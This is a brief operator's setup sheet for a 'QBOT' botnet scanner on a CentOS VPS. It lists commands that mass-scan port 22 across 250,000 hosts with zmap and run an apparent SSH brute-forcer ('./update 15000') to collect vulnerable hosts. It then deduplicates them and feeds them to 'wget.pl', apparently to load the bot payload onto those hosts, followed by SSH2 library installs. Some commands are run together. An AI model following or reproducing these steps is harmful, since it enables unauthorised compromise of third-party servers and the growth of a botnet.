
# QBOT - Scanner Setup
VPS Centos 6

yum install perl -y

sh zmap_auto_install.sh

zmap -p22 -o mfu.txt -B100M -N 250000

^^ Wait Till Finished ^^

chmod 777 *

./update 15000

cat vuln.txt | sort | uniq > nodupes.txt

perl wget.pl nodupes.txt



Fix SSH2 Issues //this will take a while:

yum install gcc cpan php-pear php-devel libssh2 libssh2-devel -y

pecl install -f ssh2 touch /etc/php.d/ssh2.ini echo

extension=ssh2.so>/etc/php.d/ssh2.ini

cpan -fi Net::SSH2

cpan -fi Parallel::ForkManager 
